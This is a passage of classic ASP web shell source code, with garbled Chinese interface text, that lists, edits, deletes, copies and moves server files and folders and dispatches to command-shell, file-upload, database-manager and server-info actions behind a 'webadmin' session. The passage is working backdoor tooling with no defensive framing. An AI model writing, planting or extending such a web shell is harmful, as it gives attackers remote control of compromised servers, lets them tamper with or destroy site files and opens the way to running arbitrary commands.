  Set FOLD=CF.GetFolder(Path)
  i=0
    SI="<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#EFEFEF'><tr>"
  For Each F in FOLD.subfolders
    SI=SI&"<td height='20'>&nbsp;"
    SI=SI&" <a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")'>"&F.Name&"</a>" 
    SI=SI&" | <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='ɾ��'>D</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>C</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='�ƶ�'>M</a>"
	i=i+1
    If i mod 3 = 0 then SI=SI&"</tr><tr>"
  Next
    SI=SI&"</tr><tr><td height=5></td></tr></table>"
	Response.Write SI : SI=""
  
  For Each L in Fold.files
    SI="<table width='100%'  border='0' cellspacing='1' cellpadding='0'>"
    SI=SI&"<tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className=''"">"
    SI=SI&"<td height='20'>&nbsp;"
	SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='����'>"&L.Name&"</a></td>"
    SI=SI&"<td width='200'>"&L.Type&"</td>"
    SI=SI&"<td width='50'>"&clng(L.size/1024)&"K</td>"
    SI=SI&"<td width='160'>"&L.DateLastModified&"</td>"
    SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='�༭'>edit</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>del</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='����'>copy</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='�ƶ�'>move</a></td>"
    SI=SI&"</tr></table>"
	Response.Write SI : SI=""
  Next
  Set FOLD=Nothing
  End function
  
  Function DelFile(Path)
    If CF.FileExists(Path) Then
	  CF.DeleteFile Path
      SI="<center><br><br><br>�ļ� "&Path&" ɾ���ɹ���</center>"
      SI=SI&BackUrl
	  Response.Write SI
	End If
  End Function
  
  Function EditFile(Path)
  If Request("Action2")="Post" Then
      Set T=CF.CreateTextFile(Path)
        T.WriteLine Request.form("content")
        T.close
      Set T=nothing
    SI="<center><br><br><br>�ļ�����ɹ���</center>"
    SI=SI&BackUrl
    Response.Write SI
	Response.End
  End If
  
  If Path<>"" Then
    Set T=CF.opentextfile(Path, 1, False)
    Txt=HTMLEncode(T.readall) 
    T.close
    Set T=Nothing
  Else
    Path=Session("FolderPath")&"\newfile.asp":Txt="�½��ļ�"
  End If
  
  SI="<table width='100%' height='100%'><tr><td valign='top' align='center'>"  
  SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
  SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
  SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
  SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
  SI=SI&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>"
  SI=SI&"</td></tr></table></body></html>"
  Response.Write SI
  End Function
  
  Function CopyFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  Response.Write SI 
	End If
  End Function

  Function MoveFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  Response.Write SI 
	End If
  End Function

  Function DelFolder(Path)
    If CF.FolderExists(Path) Then
	  CF.DeleteFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"ɾ���ɹ���</center>"
      SI=SI&BackUrl
	  Response.Write SI
	End If
  End Function

  Function CopyFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  Response.Write SI
	End If
  End Function

  Function MoveFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  Response.Write SI
	End If
  End Function

  Function NewFolder(Path)
    If Not CF.FolderExists(Path) and Path<>"" Then
	  CF.CreateFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"�½��ɹ���</center>"
      SI=SI&BackUrl
	  Response.Write SI
	End If
  End Function
End Class


Select Case Action
  Case "MainMenu":MainMenu()
  Case "ShowFile"
    Set ABC=New LBF:ABC.ShowFile(Session("FolderPath")):Set ABC=Nothing
  Case "DownFile":DownFile FName:ShowErr()
  Case "DelFile"
    Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
  Case "EditFile"
    Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
  Case "CopyFile"
    Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
  Case "MoveFile"
    Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
  Case "DelFolder"
    Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
  Case "CopyFolder"
    Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
  Case "MoveFolder"
    Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
  Case "NewFolder"
    Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
  Case "UpFile":UpFile()
  Case "CmdShell":CmdShell()
  Case "Logout":Session.Contents.Remove("webadmin"):Response.Redirect URL
  Case "CreateMdb":CreateMdb FName
  Case "CompactMdb":CompactMdb FName
  Case "DbManager":DbManager()
  Case "Course":Course()
  Case "ServerInfo":ServerInfo()
  Case Else MainForm()
End Select
ShowErr()
%>